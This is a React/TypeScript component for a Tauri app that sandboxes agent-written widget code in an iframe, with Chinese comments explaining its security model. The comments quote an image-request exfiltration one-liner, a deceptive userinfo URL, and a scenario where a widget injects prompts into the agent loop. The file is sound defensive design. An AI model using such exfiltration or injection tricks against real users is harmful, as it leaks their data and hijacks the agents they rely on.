// 部件画布（0.0.67）：把 show_widget 工具产出的 agent 编写 HTML/SVG/JS 渲染进一个
// 强隔离的 iframe。安全模型（不可妥协）：
//   sandbox="allow-scripts"，**绝不**带 allow-same-origin —— 在同源上叠加 allow-same-origin
//   会让 frame 自行卸下 sandbox 逃逸。单独 allow-scripts ＝ null/opaque 源：无 cookie/存储、
//   读不到父 DOM、所有请求 Origin:null。
//   即便 Tauri 2.11.2 已修复 IPC 注入到 null 源 iframe（GHSA-57fm-592m-34r7），仍在 wrapper
//   里加 fail-closed 自检：一旦探测到 __TAURI__ 立刻 window.stop() + 拒绝渲染（置于 <head>，跑在
//   agent 代码之前，真正阻断后续解析）。
//
// 网络出口（0.0.67 安全审查后修正——勿再误述为「零网络」）：
//   · 子资源出口（img/script/style/font 的 GET）已用「default-src 'none' + 仅 data:/blob:、零外部
//     主机」彻底封死——这是会偷「用户在 widget 表单里输入的数据」的静默信道，必须关。
//   · connect-src 'none' 封 fetch/XHR/WebSocket/sendBeacon。
//   · 唯一**无法**在 CSP/sandbox 文档层阻断的残留通道是脚本「自导航」(location.href=外部URL)：它会
//     让整个 widget 跳走/变白，**可见、一次性、噪声大**，不是静默信道；且能植入恶意 widget 的 agent
//     本就已被 prompt 注入污染、另有渠道。我们接受该残留并如实记录，不假称已 100% 断网。
// 桥接（sendPrompt/openLink）一律视为不可信来源：见 onMessage 里的用户确认门控。

import { useEffect, useRef, useState } from "react";
import { invoke } from "@tauri-apps/api/core";
import type { WidgetPart } from "../types";

/** 把 agent code 包进固定可信 wrapper，构造 iframe 的 srcdoc。code 为 HTML/SVG/JS，**原样**插入（不转义）。 */
function buildSrcdoc(code: string, theme: Record<string, string>): string {
  // 严格 CSP：default-src 'none' 全封；脚本/样式只放行 inline，**不放行任何外部主机**。
  // 安全审查教训：connect-src 'none' 只挡 fetch/XHR/WS/sendBeacon，**挡不住**经 img-src/script-src/
  // style-src/font-src 放行域发出的子资源 GET——白名单里只要有外部主机，其完整 URL 路径/查询串即一条
  // 静默外泄信道（new Image().src='https://cdn/'+btoa(secret)，能偷用户在 widget 表单里输入的数据）。
  // 故移除全部外部 CDN/字体域，子资源只允许 data:/blob:，真正「零外联」；并去掉 'unsafe-eval'（inline
  // 不需要，留着只扩大注入面）。widget 须自包含、不得依赖任何 CDN 库。
  const csp =
    "default-src 'none'; " +
    "script-src 'unsafe-inline'; " +
    "style-src 'unsafe-inline'; " +
    "img-src data: blob:; " +
    "font-src data:; " +
    "connect-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'";

  // 把宿主当前主题（已 resolve 的具体色值）注入为 widget 侧 CSS 变量，
  // 模型被告知使用这些变量名，light/dark 由宿主 getComputedStyle 决定。
  const vars = Object.entries(theme)
    .map(([k, v]) => `      ${k}: ${v};`)
    .join("\n");

  // fail-closed 自检：放在 <head>、跑在 agent 代码之前。探测到任一 Tauri 桥接全局即
  // window.stop() 中止文档解析（body 里的 agent 代码不再被解析/执行）+ 改写为拒绝提示 + throw。
  const selfCheck =
    "if (window.__TAURI__ || window.__TAURI_INTERNALS__ || window.__TAURI_INVOKE_KEY__) {" +
    " try{ window.stop(); }catch(e){}" +
    " document.documentElement.innerHTML = '<body style=\"margin:0\"><p style=\"color:#c00;font:13px system-ui;padding:12px\">\\u26A0 widget \\u9694\\u79BB\\u5931\\u8D25\\uFF0C\\u5DF2\\u62D2\\u7EDD\\u6E32\\u67D3</p></body>';" +
    " throw new Error('isolation breach'); }";

  return (
    "<!doctype html><html><head><meta charset=\"utf-8\">" +
    `<meta http-equiv="Content-Security-Policy" content="${csp}">` +
    // 自检脚本必须是文档里**第一个**执行的脚本，故置于 head、CSP meta 之后、其余内容之前。
    "<script>" + selfCheck + "</script>" +
    "<style>\n" +
    "    :root {\n" +
    vars +
    "\n    }\n" +
    "    html, body { margin: 0; }\n" +
    "    body { font-family: system-ui, sans-serif; color: var(--color-text); background: transparent; }\n" +
    "</style></head><body>\n" +
    code +
    "\n<script>\n" +
    "(function(){\n" +
    "  window.sendPrompt = function(t){ parent.postMessage({__mdgaWidget:'sendPrompt', text: String(t).slice(0,4000)}, '*'); };\n" +
    "  window.openLink = function(u){ parent.postMessage({__mdgaWidget:'openLink', url: String(u)}, '*'); };\n" +
    "  function rh(){ parent.postMessage({__mdgaWidget:'resize', height: Math.min(document.documentElement.scrollHeight, 2000)}, '*'); }\n" +
    "  window.addEventListener('load', rh);\n" +
    "  try{ new ResizeObserver(rh).observe(document.body); }catch(e){}\n" +
    "})();\n" +
    "</script>\n" +
    "</body></html>"
  );
}

/** 渲染时从宿主根元素读取已 resolve 的主题色值，映射成 widget 侧变量名。 */
function readHostTheme(): Record<string, string> {
  const cs = getComputedStyle(document.documentElement);
  const g = (name: string) => cs.getPropertyValue(name).trim();
  return {
    "--color-text": g("--text"),
    "--color-bg": g("--surface"),
    "--color-text-secondary": g("--text-2"),
    "--color-text-tertiary": g("--text-3"),
    "--border": g("--border"),
    "--brand": g("--brand"),
    "--color-success": g("--success"),
    "--color-danger": g("--danger"),
    "--on-brand": g("--on-brand"),
  };
}

/**
 * 沙箱化的部件卡片。
 * @param part   WidgetPart（code + 可选 title/kind）。
 * @param onSendPrompt  widget 内调用 sendPrompt(text) 时回灌到 agent 的发送函数；**仅在用户确认后**调用。
 */
export function WidgetCard({
  part,
  onSendPrompt,
}: {
  part: WidgetPart;
  onSendPrompt?: (text: string) => void;
}) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [height, setHeight] = useState(120);
  // sendPrompt 确认门控的并发闸：同一时刻只允许一个待确认，防恶意 widget 用 confirm 轰炸。
  const promptPendingRef = useRef(false);

  // 主题随 code 在挂载时一次性 resolve；code 变化时通过 key 整体重挂（见下方 key）。
  const srcdoc = buildSrcdoc(part.code, readHostTheme());

  useEffect(() => {
    function onMessage(event: MessageEvent) {
      // 只接受来自**本 iframe** contentWindow 且带 __mdgaWidget 标记的消息（防其它 frame / 扩展伪造）。
      const win = iframeRef.current?.contentWindow;
      if (!win || event.source !== win) return;
      const data = event.data as { __mdgaWidget?: string; height?: number; text?: string; url?: string };
      if (!data || typeof data.__mdgaWidget !== "string") return;

      if (data.__mdgaWidget === "resize") {
        const h = typeof data.height === "number" ? data.height : 120;
        setHeight(Math.max(80, Math.min(2000, h)));
      } else if (data.__mdgaWidget === "sendPrompt") {
        // sendPrompt 不可信：widget 代码可在 load/定时器里无人值守地自动调用，把任意文本当「用户输入」
        // 灌进 agent 循环（confused-deputy / 提示注入洗白）。故**必须经用户显式确认**才发，绝不自动驱动。
        // 父侧自行截断（发送方的 slice 可被绕过），并以「同时只一个待确认」节流防 confirm 轰炸。
        const text = (typeof data.text === "string" ? data.text : "").slice(0, 4000);
        if (!text.trim() || !onSendPrompt) return;
        if (promptPendingRef.current) return;
        promptPendingRef.current = true;
        const preview = text.length > 300 ? text.slice(0, 300) + "…" : text;
        const ok = window.confirm(
          "此 widget 想代你向 AI 发送下面这条消息（不是你本人输入的）：\n\n" + preview + "\n\n确定发送吗？"
        );
        promptPendingRef.current = false;
        if (ok) onSendPrompt(text);
      } else if (data.__mdgaWidget === "openLink") {
        const url = typeof data.url === "string" ? data.url : "";
        if (!url) return;
        // 确认框里**醒目展示真实主机**并剥离迷惑性 userinfo（http://good.com@evil.tld 真实落点是 evil.tld）、
        // 标注非 ASCII/Punycode 仿冒域名，避免用户被攻击者完全可控的 URL 文本诱导点「确定」。
        let host = "(无法解析)";
        let warn = "";
        try {
          const u = new URL(url);
          host = u.host;
          if (u.username || u.password) warn += "\n⚠ 链接带「用户名@」前缀，真实站点是上面的主机，请核对。";
          if (/[^\x00-\x7F]/.test(u.hostname) || /(^|\.)xn--/.test(u.hostname))
            warn += "\n⚠ 域名含非 ASCII / Punycode 字符，可能是仿冒域名。";
        } catch {
          /* 非法 URL：host 保持「无法解析」，后端仍会再校验 http(s) */
        }
        if (window.confirm("在浏览器打开此链接？\n\n站点主机：" + host + warn + "\n\n完整地址：\n" + url)) {
          invoke("open_external_url", { url }).catch(() => {});
        }
      }
    }
    window.addEventListener("message", onMessage);
    return () => window.removeEventListener("message", onMessage);
  }, [onSendPrompt]);

  return (
    <div className="widget-card">
      {part.title && <div className="widget-card__title">{part.title}</div>}
      <iframe
        // code 变化时整体重挂（避免旧 srcdoc/监听残留）。
        key={part.code}
        ref={iframeRef}
        className="widget-card__frame"
        title={part.title ?? "widget"}
        sandbox="allow-scripts"
        srcDoc={srcdoc}
        style={{
          width: "100%",
          height,
          border: "1px solid var(--border)",
          borderRadius: 8,
          background: "transparent",
        }}
      />
    </div>
  );
}
